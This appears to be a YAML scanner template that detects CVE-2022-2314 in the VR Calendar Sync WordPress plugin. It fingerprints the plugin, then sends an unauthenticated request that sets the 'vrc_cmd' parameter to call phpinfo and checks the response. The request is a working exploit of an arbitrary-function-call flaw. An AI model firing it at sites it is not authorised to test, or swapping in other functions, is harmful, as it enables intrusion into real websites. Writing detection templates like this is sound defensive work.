name: yaml-poc-vr_calendar_project-vr_calendar-unauthorized_access-CVE-2022-2314
binding: 939a3fd1-4cb1-439c-8551-533ec61f2d41
detail:
    author: jiapeng.han
    links:
        - https://cxsecurity.com/cveshow/CVE-2022-2314/
        - https://wpscan.com/vulnerability/b22fe77c-844e-4c24-8023-014441cc1e82
    vulnerability:
        id: ddfc63f7-7f04-4f42-9b43-cd8ceaf91b72
        level: critical
    warning: Harmless
transport: http
rules:
    check:
        request:
            cache: true
            method: GET
            path: /wp-content/plugins/vr-calendar-sync/assets/js/public.js
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains("vrc-calendar")
    r1:
        request:
            cache: true
            method: GET
            path: /wp-admin/admin-post.php?vrc_cmd=phpinfo
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains("PHP Version") && response.body_string.contains("<h1>Configuration</h1>")
expression: check() && r1()
